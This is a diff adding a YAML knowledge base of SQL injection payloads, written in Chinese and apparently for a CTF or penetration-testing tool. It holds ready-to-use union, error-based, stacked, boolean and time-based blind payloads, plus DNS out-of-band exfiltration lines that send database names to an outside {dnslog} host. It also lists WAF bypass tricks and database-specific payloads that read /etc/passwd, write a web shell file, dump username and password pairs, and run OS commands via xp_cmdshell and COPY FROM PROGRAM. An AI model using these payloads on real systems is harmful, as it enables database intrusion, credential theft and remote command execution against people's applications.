@@ -1,0 +1,177 @@
+# SQL 注入 Payload 知识库
+# 来源: Des-CTF-Knowledge + Hunter 实战经验
+# 更新: 2026-06-02
+
+metadata:
+  category: sqli
+  description: "SQL 注入 Payload 集合"
+  version: "1.0"
+
+# ============================================
+# 1. 联合注入（有回显）
+# ============================================
+union_injection:
+  description: "联合查询注入，适用于有回显的场景"
+  detect:
+    - payload: "' ORDER BY {col}--"
+      description: "猜解列数"
+      range: [1, 100]
+    - payload: "' UNION SELECT NULL,NULL,NULL--"
+      description: "确认列数（NULL数量=列数）"
+    - payload: "' UNION SELECT 1,2,3--"
+      description: "确认回显位"
+  exploit:
+    database:
+      - "' UNION SELECT 1,database(),3--"
+      - "' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata--"
+    tables:
+      - "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema='{db}'--"
+    columns:
+      - "' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_schema='{db}' AND table_name='{table}'--"
+    data:
+      - "' UNION SELECT 1,group_concat({col1},0x3a,{col2}),3 FROM {db}.{table}--"
+  bypass:
+    - "' /*!UNION*/ /*!SELECT*/ 1,2,3--"
+    - "' %55NION %53ELECT 1,2,3--"
+    - "' UNION%0ASELECT%0A1,2,3--"
+
+# ============================================
+# 2. 报错注入
+# ============================================
+error_based:
+  description: "报错注入，利用数据库错误信息回显数据"
+  extractvalue:
+    - "' AND extractvalue(1,concat(0x5c,(SELECT database())))--"
+    - "' AND extractvalue(1,concat(0x5c,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema='{db}')))--"
+    - "' AND extractvalue(1,concat(0x7e,(SELECT left({col},30) FROM {db}.{table})))--"
+  updatexml:
+    - "' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--"
+    - "' AND updatexml(1,concat(0x7e,(SELECT concat(username,0x3a,password) FROM users LIMIT 0,1),0x7e),1)--"
+  bigint_overflow:
+    - "' AND exp(~(SELECT * FROM (SELECT user())a))--"
+    - "' AND exp(~(SELECT * FROM (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)a))--"
+  floor:
+    - "' AND (SELECT 1 FROM (SELECT count(*),concat((SELECT database()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+
+# ============================================
+# 3. 堆叠注入
+# ============================================
+stacked_queries:
+  description: "堆叠注入，可执行多条SQL语句"
+  basic:
+    - "'; SHOW DATABASES;--"
+    - "'; SHOW TABLES;--"
+    - "'; SHOW COLUMNS FROM `{table}`;--"
+  rename:
+    - "'; RENAME TABLE `{table1}` TO `{table2}`; RENAME TABLE `{table3}` TO `{table1}`; ALTER TABLE `{table1}` CHANGE `{col1}` `{col2}` VARCHAR(100);--"
+  handler:
+    - "'; HANDLER {table} OPEN; HANDLER {table} READ FIRST; HANDLER {table} CLOSE;--"
+  prepare:
+    - "'; PREPARE hacker FROM concat('s','elect', ' * from `{table}` '); EXECUTE hacker;--"
+    - "SET @a=0x{hex}; PREPARE hacker FROM @a; EXECUTE hacker;--"
+
+# ============================================
+# 4. 盲注
+# ============================================
+blind:
+  description: "盲注，无直接回显"
+  boolean:
+    description: "布尔盲注"
+    length:
+      - "' AND LENGTH(database())>{n}--"
+      - "' AND LENGTH(database())={n}--"
+    char:
+      - "' AND ASCII(SUBSTR(database(),{pos},1))>{n}--"
+      - "' AND ASCII(SUBSTR(database(),{pos},1))={n}--"
+    table:
+      - "' AND ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT {offset},1),{pos},1))>{n}--"
+  time_based:
+    description: "时间盲注"
+    sleep:
+      - "' AND SLEEP({seconds})--"
+      - "' OR IF(1=1,SLEEP({seconds}),0)--"
+      - "'; IF((SELECT COUNT(*) FROM users)>0,SLEEP({seconds}),NULL)--"
+    benchmark:
+      - "' AND BENCHMARK(10000000,SHA1('test'))--"
+      - "'; IF(EXISTS(SELECT * FROM information_schema.tables WHERE table_name='{table}'),BENCHMARK(10000000,SHA1('a')),NULL)--"
+  dnslog:
+    description: "DNS外带"
+    mysql:
+      - "' AND (SELECT LOAD_FILE(concat('\\\\\\\\',(SELECT database()),'.{dnslog}\\\\a')))--"
+      - "' UNION SELECT LOAD_FILE(concat('\\\\\\\\',(SELECT user()),'.{dnslog}\\\\a'))--"
+
+# ============================================
+# 5. WAF 绕过
+# ============================================
+waf_bypass:
+  description: "WAF/过滤绕过技巧"
+  space_bypass:
+    - "/**/"  # 内联注释替代空格
+    - "%09"   # Tab
+    - "%0a"   # 换行
+    - "%0b"   # 垂直制表符
+    - "%0c"   # 换页
+    - "%0d"   # 回车
+    - "%a0"   # 空格（某些编码）
+    - "()"    # 括号包裹
+  equal_bypass:
+    - "LIKE"
+    - "REGEXP"
+    - "BETWEEN"
+    - "<>"
+    - "IN"
+  comma_bypass:
+    - "JOIN"   # UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b
+    - "OFFSET" # LIMIT 1 OFFSET 1
+    - "CASE"   # CASE WHEN...THEN...END
+  keyword_bypass:
+    - "UNIunionON SELselectECT"  # 双写
+    - "/*!50000UNION*/ SELECT"   # 内联注释
+    - "UNION%0ASELECT"           # 换行
+  function_bypass:
+    sleep: ["BENCHMARK", "GET_LOCK"]
+    substring: ["MID", "SUBSTR", "LEFT", "RIGHT"]
+    group_concat: ["CONCAT_WS", "LIMIT+OFFSET逐行查"]
+
+# ============================================
+# 6. 特定数据库 Payload
+# ============================================
+mysql_specific:
+  version: "' UNION SELECT 1,version(),3--"
+  user: "' UNION SELECT 1,user(),3--"
+  current_user: "' UNION SELECT 1,current_user(),3--"
+  datadir: "' UNION SELECT 1,@@datadir,3--"
+  basedir: "' UNION SELECT 1,@@basedir,3--"
+  read_file: "' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--"
+  write_file: "' UNION SELECT 1,2 INTO OUTFILE '/tmp/shell.php'--"
+
+postgresql_specific:
+  version: "' UNION SELECT NULL,version(),NULL--"
+  current_user: "' UNION SELECT NULL,current_user,NULL--"
+  read_file: "' UNION SELECT NULL,pg_read_file('/etc/passwd'),NULL--"
+  command: "'; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM '{cmd}';--"
+
+mssql_specific:
+  version: "' UNION SELECT NULL,@@version,NULL--"
+  user: "' UNION SELECT NULL,SYSTEM_USER,NULL--"
+  command: "'; EXEC xp_cmdshell '{cmd}'--"
+  read_file: "'; EXEC xp_cmdshell 'type C:\\Windows\\win.ini'--"
+
+oracle_specific:
+  version: "' UNION SELECT NULL,banner FROM v$version WHERE ROWNUM=1--"
+  user: "' UNION SELECT NULL,user FROM dual--"
+  read_file: "' UNION SELECT NULL,XMLType('file:///etc/passwd'),NULL FROM dual--"
+
+# ============================================
+# 7. 注入检测 Payload
+# ============================================
+detection:
+  description: "用于检测是否存在注入"
+  single_quote: "'"
+  double_quote: "\""
+  backslash: "\\"
+  comment: "--"
+  parenthesis: "')"
+  sleep_5: "' AND SLEEP(5)--"
+  benchmark: "' AND BENCHMARK(10000000,SHA1('a'))--"
+  time_delay: "'; WAITFOR DELAY '0:0:5'--"
